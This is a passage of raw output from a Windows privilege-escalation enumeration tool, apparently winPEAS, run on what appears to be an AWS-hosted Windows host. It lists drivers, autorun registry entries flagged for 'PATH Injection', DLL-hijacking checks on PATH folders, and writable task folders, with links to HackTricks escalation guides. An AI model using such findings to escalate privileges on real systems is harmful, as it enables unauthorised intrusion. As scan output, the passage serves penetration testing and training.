    @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver(Intel Corporation - @ialpssi_i2c.inf,%iaLPSSi_I2C.SVCDESC%;Intel(R) Serial IO I2C Controller Driver)[C:\windows\System32\drivers\iaLPSSi_I2C.sys] - System                                                                                            
   =================================================================================================

    @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller(Intel Corporation - @iastorav.inf,%iaStorAVC.DeviceDesc%;Intel Chipset SATA RAID Controller)[System32\drivers\iaStorAVC.sys] - Boot
   =================================================================================================

    @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7(Intel Corporation - @iastorv.inf,%*PNP0600.DeviceDesc%;Intel RAID Controller Windows 7)[System32\drivers\iaStorV.sys] - Boot
   =================================================================================================

    @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver)(Mellanox - @mlx4_bus.inf,%Ibbus.ServiceDesc%;Mellanox InfiniBand Bus/AL (Filter Driver))[C:\windows\System32\drivers\ibbus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator(Mellanox - @mlx4_bus.inf,%MLX4BUS.ServiceDesc%;Mellanox ConnectX Bus Enumerator)[C:\windows\System32\drivers\mlx4_bus.sys] - System
   =================================================================================================

    @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service(Mellanox - @mlx4_bus.inf,%ndfltr.ServiceDesc%;NetworkDirect Service)[C:\windows\System32\drivers\ndfltr.sys] - System
   =================================================================================================

    PsShutdown(PsShutdown)[C:\windows\PSSDNSVC.EXE] - System
   =================================================================================================

    @netqevbda.inf,%vbd_srv_desc%;QLogic FastLinQ Ethernet VBD(Cavium, Inc. - @netqevbda.inf,%vbd_srv_desc%;QLogic FastLinQ Ethernet VBD)[System32\drivers\qevbda.sys] - Boot
   =================================================================================================

    @qefcoe.inf,%QEFCOE.SVCDESC%;QLogic FCoE driver(Cavium, Inc. - @qefcoe.inf,%QEFCOE.SVCDESC%;QLogic FCoE driver)[System32\drivers\qefcoe.sys] - Boot
   =================================================================================================

    @qeois.inf,%QEOIS.SVCDESC%;QLogic 40G iSCSI Driver(QLogic Corporation - @qeois.inf,%QEOIS.SVCDESC%;QLogic 40G iSCSI Driver)[System32\drivers\qeois.sys] - Boot
   =================================================================================================

    @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @ql2300.inf,%ql2300i.DriverDesc%;QLogic Fibre Channel STOR Miniport Inbox Driver (wx64))[System32\drivers\ql2300i.sys] - Boot                                                                                            
   =================================================================================================

    @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver(QLogic Corporation - @ql40xx2i.inf,%ql40xx2i.DriverDesc%;QLogic iSCSI Miniport Inbox Driver)[System32\drivers\ql40xx2i.sys] - Boot
   =================================================================================================

    @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64)(QLogic Corporation - @qlfcoei.inf,%qlfcoei.DriverDesc%;QLogic [FCoE] STOR Miniport Inbox Driver (wx64))[System32\drivers\qlfcoei.sys] - Boot
   =================================================================================================

    OpenSSH Authentication Agent(OpenSSH Authentication Agent)[C:\windows\System32\OpenSSH\ssh-agent.exe] - Manual
    Agent to hold private keys used for public key authentication.
   =================================================================================================          

    @usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver(@usbstor.inf,%USBSTOR.SvcDesc%;USB Mass Storage Driver)[C:\windows\System32\drivers\USBSTOR.SYS] - System
   =================================================================================================

    @usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller(@usbxhci.inf,%PCI\CC_0C0330.DeviceDesc%;USB xHCI Compliant Host Controller)[C:\windows\System32\drivers\USBXHCI.SYS] - System
   =================================================================================================

    Veeam ONE Agent(Veeam Software AG - Veeam ONE Agent)["C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe" -id=3be6b89b-e6de-4e97-bcd4-5c14e9d97fc1] - Autoload - isDotNet                     
    Enables remediation actions and communication between Veeam ONE and monitored Veeam Backup & Replication servers.                                                                                                       
   =================================================================================================          

    @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver(VMware, Inc. - @oem2.inf,%loc.vmciServiceDisplayName%;VMware VMCI Bus Driver)[System32\drivers\vmci.sys] - Boot
   =================================================================================================

    @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver(VIA Corporation - @vstxraid.inf,%Driver.DeviceDesc%;VIA StorX Storage RAID Controller Windows Driver)[System32\drivers\vstxraid.sys] - Boot
   =================================================================================================

    @%SystemRoot%\System32\drivers\vwifibus.sys,-257(@%SystemRoot%\System32\drivers\vwifibus.sys,-257)[C:\windows\System32\drivers\vwifibus.sys] - System                                                                   
    @%SystemRoot%\System32\drivers\vwifibus.sys,-258
   =================================================================================================          

    @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service(Mellanox - @mlx4_bus.inf,%WinMad.ServiceDesc%;WinMad Service)[C:\windows\System32\drivers\winmad.sys] - System
   =================================================================================================

    @winusb.inf,%WINUSB_SvcName%;WinUsb Driver(@winusb.inf,%WINUSB_SvcName%;WinUsb Driver)[C:\windows\System32\drivers\WinUSB.SYS] - System                                                                                 
    @winusb.inf,%WINUSB_SvcDesc%;Generic driver for USB devices
   =================================================================================================          

    @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service(Mellanox - @mlx4_bus.inf,%WinVerbs.ServiceDesc%;WinVerbs Service)[C:\windows\System32\drivers\winverbs.sys] - System
   =================================================================================================

    @oem3.inf,%XenBusName%;AWS PV Bus(Amazon Inc. - @oem3.inf,%XenBusName%;AWS PV Bus)[System32\drivers\xenbus.sys] - Boot                                                                                                  
   =================================================================================================

    @oem3.inf,%XenFiltName%;AWS Bus Filter(Amazon Inc. - @oem3.inf,%XenFiltName%;AWS Bus Filter)[System32\drivers\xenfilt.sys] - Boot                                                                                       
   =================================================================================================

    @oem4.inf,%XenIfaceDevice.DeviceDesc%;AWS Interface(Amazon Inc. - @oem4.inf,%XenIfaceDevice.DeviceDesc%;AWS Interface)[C:\windows\System32\drivers\xeniface.sys] - System
   =================================================================================================

    @oem5.inf,%XenNetName%;AWS PV Network Device(Amazon Inc. - @oem5.inf,%XenNetName%;AWS PV Network Device)[C:\windows\System32\drivers\xennet.sys] - System                                                               
   =================================================================================================

    @oem6.inf,%XenVbdName%;AWS PV Storage Host Adapter(Amazon Inc. - @oem6.inf,%XenVbdName%;AWS PV Storage Host Adapter)[System32\drivers\xenvbd.sys] - Boot
   =================================================================================================

    @oem7.inf,%XenVifName%;AWS PV Network Class(Amazon Inc. - @oem7.inf,%XenVifName%;AWS PV Network Class)[C:\windows\System32\drivers\xenvif.sys] - System                                                                 
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Modifiable Services
È Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                                                             
    You cannot modify any service

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry
È Check if you can modify the registry of a service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-permissions                                                          
    [-] Looks like you cannot change the registry of any service...

ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking write permissions in PATH folders (DLL Hijacking)
È Check for DLL Hijacking in PATH folders https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dll-hijacking                                                                                    
    C:\windows\system32
    C:\windows
    C:\windows\System32\Wbem
    C:\windows\System32\WindowsPowerShell\v1.0\
    C:\windows\System32\OpenSSH\
    C:\Program Files\Microsoft\Web Platform Installer\


ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Applications Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed Applications --Via Program Files/Uninstall registry--
È Check if you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software                                                                                      
    C:\Program Files\Amazon
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\internet explorer
    C:\Program Files\Microsoft
    C:\Program Files\Uninstall Information
    C:\Program Files\Veeam
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows Multimedia Platform
    C:\Program Files\windows nt
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Portable Devices
    C:\Program Files\Windows Security
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


ÉÍÍÍÍÍÍÍÍÍÍ¹ Autorun Applications
È Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                  
Error getting autoruns from WMIC: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()                                                                
   at System.Management.ManagementScope.Initialize()                                                          
   at System.Management.ManagementObjectSearcher.Initialize()                                                 
   at System.Management.ManagementObjectSearcher.Get()                                                        
   at hu.b()                                                                                                  

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: SecurityHealth
    Folder: C:\windows\system32
    File: C:\windows\system32\SecurityHealthSystray.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Users [AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\windows\system32
    File: C:\windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}
    Key: StubPath
    Folder: C:\Program Files (x86)\Microsoft\Edge\Application\84.0.522.48\Installer
    File: C:\Program Files (x86)\Microsoft\Edge\Application\84.0.522.48\Installer\setup.exe --configure-user-settings --verbose-logging --system-level (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenUser
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}                                                                                                   
    Key: StubPath
    Folder: C:\windows\system32
    File: C:\windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}                                                                                                   
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}                                                                                                   
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}                                                                                                   
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\iesetup.dll,IEHardenUser
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)                                                                                                            
   =================================================================================================


    Folder: C:\Users\MichelleWat\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: MichelleWat [AllAccess]
    File: C:\Users\MichelleWat\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)                                                                                      
    FilePerms: MichelleWat [AllAccess]
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
È Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                        

ÉÍÍÍÍÍÍÍÍÍÍ¹ Device Drivers --Non Microsoft--
È Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#vulnerable-drivers                                                           
    XENBUS - 8.2.7.58 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenbus.sys
    XEN - 8.2.7.58 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xen.sys
    XENFILT - 8.2.7.58 [Amazon Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\xenfilt.sys
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys                                                                                                       
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    QLogic FastLinQ Ethernet - 8.33.20.103 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qevbda.sys                                                                                                            
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys                                                                                                   
    VMware PCI VMCI Bus Device - 9.8.16.0 build-14168184 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys                                                                                                
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys                                                                                            
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys                                                                                        
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys                                                                                                     
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys                                                                                                      
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys                                                                                  
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys                                                                                                         
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys                                                                                           
